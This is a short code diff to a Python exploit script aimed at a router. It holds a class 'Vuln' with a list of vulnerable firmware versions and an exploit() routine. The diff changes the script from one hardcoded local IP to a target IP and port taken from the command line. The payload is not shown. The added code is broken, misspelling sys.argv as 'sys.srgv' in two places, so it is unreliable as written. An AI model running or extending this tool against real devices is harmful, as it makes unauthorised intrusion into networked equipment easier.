@@ -21,7 +21,7 @@ print_e = printer('FAIL')
 
 class Vuln():
 	long_stack=['6.33', '6.33.1', '6.33.2', '6.33.3', '6.33.5', '6.33.6', '6.34', '6.34.1', '6.34.2', '6.34.3', '6.34.4', '6.34.5', '6.34.6', '6.35', '6.35.1', '6.35.2', '6.35.4', '6.36', '6.36.1', '6.36.2', '6.36.3', '6.36.4', '6.37', '6.37.1', '6.37.2', '6.37.3', '6.37.4', '6.37.5', '6.38', '6.38.1', '6.38.2', '6.38.3', '6.38.4']
-	def __init__(self,ip,port=80):
+	def __init__(self,ip,port):
 		self.ip=ip
 		self.port=port
 		self.version=self.get_version()
@@ -123,5 +123,9 @@ class Vuln():
 			self.celebrate()
 		else:
 			print_e("How can I attack a target that is not vulnerable?")
-router=Vuln('192.168.0.37')
-router.exploit()
+if __name__ == "__main__":
+	if len(sys.srgv) > 1:
+		router=Vuln(sys.argv[1],sys.argv[2] if len(sys.srgv) == 3 else 80)
+		router.exploit()
+	else:
+		print_e('Usage: %s IP [PORT]'%sys.argv[0])
